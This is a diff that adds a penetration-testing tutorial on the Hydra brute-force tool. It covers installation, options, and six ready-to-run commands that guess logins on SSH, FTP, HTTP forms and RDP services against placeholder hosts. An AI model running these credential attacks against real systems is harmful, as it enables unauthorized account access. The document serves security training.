@@ -246,4 +246,123 @@ Password reuse is a major risk. If a user’s password is compromised on one pla
 
 ---
 
+# Hydra 
+
+Hydra is a powerful brute-force tool used to crack authentication credentials for various services. It is widely used in penetration testing to test the security of login mechanisms.  
+
+#### **Why Use Hydra?**
+- **Speed & Efficiency** – Uses parallel connections to attempt multiple logins simultaneously.  
+- **Versatility** – Supports many protocols including SSH, FTP, HTTP, RDP, databases, and more.  
+- **Easy to Use** – Simple command-line interface with a clear syntax.  
+
+
+### **Installation & Setup:**
+Hydra is pre-installed on most penetration testing distributions (e.g., Kali Linux).  
+
+To check if Hydra is installed:  
+```bash
+hydra -h
+```
+If not installed, install it on Debian-based systems using:  
+```bash
+sudo apt-get update && sudo apt-get install hydra
+```
+
+
+
+### **Basic Hydra Syntax:**
+```bash
+hydra [options] service://target
+```
+
+#### **Common Parameters:**
+| Option | Description | Example |
+|--------|------------|---------|
+| `-l USER` / `-L FILE` | Single username / List of usernames | `-l admin` / `-L usernames.txt` |
+| `-p PASS` / `-P FILE` | Single password / List of passwords | `-p password123` / `-P passwords.txt` |
+| `-t TASKS` | Number of parallel attack attempts | `-t 4` |
+| `-f` | Stop after first successful login | `-f` |
+| `-s PORT` | Specify a non-default port | `-s 2222` |
+| `-v` / `-V` | Verbose output (detailed attack info) | `-V` for more details |
+
+
+### **Hydra Service Modules:**
+Hydra supports a variety of services for brute-force attacks. Some commonly used ones include:
+
+| **Service** | **Protocol** | **Description** | **Example Command** |
+|------------|------------|----------------|------------------|
+| **FTP** | File Transfer Protocol | Cracks FTP login credentials | `hydra -l admin -P passwords.txt ftp://192.168.1.100` |
+| **SSH** | Secure Shell | Brute-force SSH logins | `hydra -l root -P passwords.txt ssh://192.168.1.100` |
+| **HTTP-POST** | Web Login Forms | Cracks web authentication | `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"` |
+| **SMTP** | Email Authentication | Cracks email server login credentials | `hydra -l admin -P passwords.txt smtp://mail.example.com` |
+| **IMAP/POP3** | Email Access Protocols | Tests email account credentials | `hydra -l user@example.com -P passwords.txt imap://mail.example.com` |
+| **MySQL/MSSQL** | Database Authentication | Brute-force login for database access | `hydra -l root -P passwords.txt mysql://192.168.1.100` |
+| **RDP** | Remote Desktop Protocol | Cracks Windows RDP logins | `hydra -l administrator -P passwords.txt rdp://192.168.1.100` |
+
+
+### **Practical Attack Scenarios**
+
+#### **1. SSH Brute-Force Attack**
+Targeting an SSH service using a wordlist of passwords:  
+```bash
+hydra -l root -P passwords.txt ssh://192.168.1.100
+```
+This command:  
+✅ Uses "root" as the username  
+✅ Tries all passwords from `passwords.txt`  
+✅ Targets SSH on `192.168.1.100`  
+
+
+#### **2. Brute-Forcing HTTP Authentication**
+If a website uses basic HTTP authentication, Hydra can brute-force it:  
+```bash
+hydra -L usernames.txt -P passwords.txt www.example.com http-get
+```
+✅ Uses a list of usernames from `usernames.txt`  
+✅ Tries all passwords from `passwords.txt`  
+✅ Targets the login authentication of `www.example.com`  
+
+
+
+#### **3. Brute-Forcing a Web Login Form**
+If the login form requires a username and password via a POST request:  
+```bash
+hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
+```
+✅ Uses "admin" as the username  
+✅ Tries all passwords from `passwords.txt`  
+✅ Targets `/login` endpoint  
+✅ Looks for HTTP status `302` to identify a successful login  
+
+
+#### **4. Brute-Forcing Multiple SSH Targets**
+If multiple SSH servers are listed in a file (`targets.txt`):  
+```bash
+hydra -l root -p toor -M targets.txt ssh
+```
+✅ Uses "root" as the username  
+✅ Tries "toor" as the password  
+✅ Targets all IPs listed in `targets.txt`  
+
+
+#### **5. Testing FTP Credentials on a Non-Standard Port**
+If an FTP service runs on a non-default port (e.g., `2121`):  
+```bash
+hydra -L usernames.txt -P passwords.txt -s 2121 ftp://ftp.example.com
+```
+✅ Targets FTP service on `ftp.example.com`  
+✅ Uses port `2121`  
+✅ Tries all username-password combinations from the lists  
+
+
+
+#### **6. Advanced RDP Brute-Forcing**
+If the password format is unknown but has a defined length and character set:  
+```bash
+hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
+```
+✅ Uses "administrator" as the username  
+✅ Generates passwords between `6-8` characters using a defined charset  
+✅ Targets the RDP service on `192.168.1.100`  
+
 
